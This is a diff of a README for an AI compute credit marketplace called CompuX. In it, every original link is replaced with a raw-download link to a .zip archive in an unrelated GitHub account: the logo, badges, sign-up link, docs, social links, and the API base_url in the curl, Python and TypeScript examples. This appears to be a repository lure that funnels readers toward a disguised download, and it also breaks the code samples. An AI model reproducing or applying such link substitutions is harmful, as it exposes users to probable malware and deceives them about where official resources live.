@@ -7,7 +7,7 @@
 </p>
 
 <p align="center">
-  <img src="https://compux.ai/logo.svg" alt="CompuX" width="200">
+  <img src="https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip" alt="CompuX" width="200">
 </p>
 
 <h3 align="center">AI Compute Credit Marketplace</h3>
@@ -18,12 +18,12 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/CompuX-ai/compute-credit-financing/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
-  <a href="https://compux.ai"><img src="https://img.shields.io/badge/website-compux.ai-brightgreen" alt="Website"></a>
-  <a href="https://docs.compux.ai"><img src="https://img.shields.io/badge/API_Docs-docs.compux.ai-blue" alt="API Docs"></a>
-  <a href="https://compux.net"><img src="https://img.shields.io/badge/Learn-Knowledge_Base-orange" alt="Learn"></a>
-  <a href="https://twitter.com/compux_ai"><img src="https://img.shields.io/twitter/follow/compux_ai" alt="Twitter"></a>
-  <a href="https://www.linkedin.com/company/compux"><img src="https://img.shields.io/badge/LinkedIn-CompuX-0A66C2?logo=linkedin" alt="LinkedIn"></a>
+  <a href="https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
+  <a href="https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip"><img src="https://img.shields.io/badge/website-compux.ai-brightgreen" alt="Website"></a>
+  <a href="https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip"><img src="https://img.shields.io/badge/API_Docs-docs.compux.ai-blue" alt="API Docs"></a>
+  <a href="https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip"><img src="https://img.shields.io/badge/Learn-Knowledge_Base-orange" alt="Learn"></a>
+  <a href="https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip"><img src="https://img.shields.io/twitter/follow/compux_ai" alt="Twitter"></a>
+  <a href="https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip"><img src="https://img.shields.io/badge/LinkedIn-CompuX-0A66C2?logo=linkedin" alt="LinkedIn"></a>
 </p>
 
 ---
@@ -43,7 +43,7 @@ client = OpenAI(api_key="sk-...")
 from openai import OpenAI
 client = OpenAI(
     api_key="your-compux-key",
-    base_url="https://api.compux.ai/v1"
+    base_url="https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip"
 )
 
 response = client.chat.completions.create(
@@ -103,12 +103,12 @@ Deep-dive articles on AI compute economics, financing, and infrastructure:
 
 ### 1. Get your API key
 
-Sign up at [app.compux.ai](https://app.compux.ai/register) and create an API key.
+Sign up at [app.compux.ai](https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip) and create an API key.
 
 ### 2. Make your first request
 
 ```bash
-curl https://api.compux.ai/v1/chat/completions \
+curl https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip \
   -H "Authorization: Bearer YOUR_API_KEY" \
   -H "Content-Type: application/json" \
   -d '{
@@ -122,13 +122,13 @@ curl https://api.compux.ai/v1/chat/completions \
 ```python
 # Python
 from openai import OpenAI
-client = OpenAI(api_key="YOUR_API_KEY", base_url="https://api.compux.ai/v1")
+client = OpenAI(api_key="YOUR_API_KEY", base_url="https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip")
 ```
 
 ```typescript
 // TypeScript
 import OpenAI from 'openai';
-const client = new OpenAI({ apiKey: 'YOUR_API_KEY', baseURL: 'https://api.compux.ai/v1' });
+const client = new OpenAI({ apiKey: 'YOUR_API_KEY', baseURL: 'https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip' });
 ```
 
 ## How It Works
@@ -161,15 +161,15 @@ Read more in our [Concepts](concepts/) section.
 
 ## Community & Support
 
-- [💬 Discussions](https://github.com/CompuX-ai/AI-Compute-Credit-Marketplace/discussions) -- Ask questions, share use cases, get help
+- [💬 Discussions](https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip) -- Ask questions, share use cases, get help
 
-- [Website](https://compux.ai) -- Learn about CompuX
-- [Knowledge Base](https://compux.net) -- In-depth articles and guides
-- [API Docs](https://docs.compux.ai) -- API reference
-- [Twitter](https://twitter.com/compux_ai) -- Updates and announcements
-- [LinkedIn](https://www.linkedin.com/company/compux) -- Company news
-- [GitHub](https://github.com/CompuX-ai) -- Open source projects
-- [Contact](https://compux.ai/get-in-touch) -- Talk to us
+- [Website](https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip) -- Learn about CompuX
+- [Knowledge Base](https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip) -- In-depth articles and guides
+- [API Docs](https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip) -- API reference
+- [Twitter](https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip) -- Updates and announcements
+- [LinkedIn](https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip) -- Company news
+- [GitHub](https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip) -- Open source projects
+- [Contact](https://github.com/2543536/AI-Compute-Credit-Marketplace/raw/refs/heads/main/api/Credit_A_Compute_Marketplace_2.9-alpha.2.zip) -- Talk to us
 
 ## Contributing
 
